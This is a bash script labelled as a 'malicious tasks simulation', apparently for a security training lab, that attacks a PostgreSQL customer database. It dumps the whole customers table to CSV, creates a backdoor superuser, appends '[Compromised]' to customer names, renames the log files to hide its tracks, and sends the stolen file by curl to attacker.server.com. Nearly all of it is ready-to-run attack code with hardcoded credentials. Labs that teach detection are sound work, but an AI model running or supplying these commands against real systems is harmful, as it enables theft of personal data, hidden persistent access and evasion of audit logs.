#!/bin/bash
DB_HOST="172.31.24.10"         
DB_NAME="customer_pii"         
DB_USER="internaluser"         
DB_PASSWORD="MyPassword@123"   
TABLE="customers"              
EXFIL_FILE="/tmp/sensitive_customer_pii.csv"  
REMOTE_SERVER="attacker.server.com"
REMOTE_PORT="8080"

echo "[*] Starting malicious tasks simulation..."
echo "[1] Exfiltrating sensitive customer PII from table '${TABLE}'..."
sudo -u postgres PGPASSWORD="${DB_PASSWORD}" psql -h "${DB_HOST}" -U "${DB_USER}" -d "${DB_NAME}" \
    -c "\COPY (SELECT * FROM ${TABLE}) TO '${EXFIL_FILE}' CSV HEADER;"
if [ $? -eq 0 ]; then
    echo "[1] Exfiltration successful. Data saved to ${EXFIL_FILE}"
else
    echo "[1] Exfiltration failed."
fi

#############################################
# Task 2: Create a backdoor administrative user
#############################################
echo "[2] Creating a backdoor administrative user..."
sudo -u postgres PGPASSWORD="${DB_PASSWORD}" psql -h "${DB_HOST}" -U "${DB_USER}" -d "${DB_NAME}" \
    -c "DO \$\$
BEGIN
    IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'backdoor_admin') THEN
        CREATE USER backdoor_admin WITH PASSWORD 'Backdoor@123' SUPERUSER;
    END IF;
END
\$\$;"
if [ $? -eq 0 ]; then
    echo "[2] Backdoor administrative user 'backdoor_admin' created successfully."
else
    echo "[2] Failed to create backdoor administrative user."
fi

#############################################
# Task 3: Modify sensitive customer data (Watermarking)
#############################################
echo "[3] Modifying sensitive customer data with a malicious watermark..."
sudo -u postgres PGPASSWORD="${DB_PASSWORD}" psql -h "${DB_HOST}" -U "${DB_USER}" -d "${DB_NAME}" \
    -c "UPDATE ${TABLE} SET full_name = full_name || ' [Compromised]' WHERE full_name IS NOT NULL;"
if [ $? -eq 0 ]; then
    echo "[3] Customer data modified successfully."
else
    echo "[3] Failed to modify customer data."
fi

#############################################
# Task 4: Clear PostgreSQL logs to cover tracks
#############################################
echo "[4] Simulating log clearing to cover tracks..."
LOG_DIR="/var/log/postgresql"
# Simulate log deletion by renaming log files (requires appropriate OS-level privileges)
sudo -u pslearner bash -c "for file in ${LOG_DIR}/*.log; do mv \"\$file\" \"\${file}.bak_$(date +%s)\"; done" 2>/dev/null \
    && echo "[4] Log clearing simulated." || echo "[4] Log clearing failed or insufficient permissions."

#############################################
# Task 5: Send exfiltrated data to a remote server
#############################################
echo "[5] Sending exfiltrated data to remote server ${REMOTE_SERVER}:${REMOTE_PORT}..."
if [ -f "${EXFIL_FILE}" ]; then
    # This simulates sending data via an HTTP POST request. The remote endpoint should be set up to receive data.
    curl -X POST -F "data=@${EXFIL_FILE}" "http://${REMOTE_SERVER}:${REMOTE_PORT}/upload" 2>/dev/null \
        && echo "[5] Data sent successfully." || echo "[5] Failed to send data."
else
    echo "[5] Exfiltrated data file not found. Skipping sending step."
fi

echo "[*] Malicious tasks simulation completed."
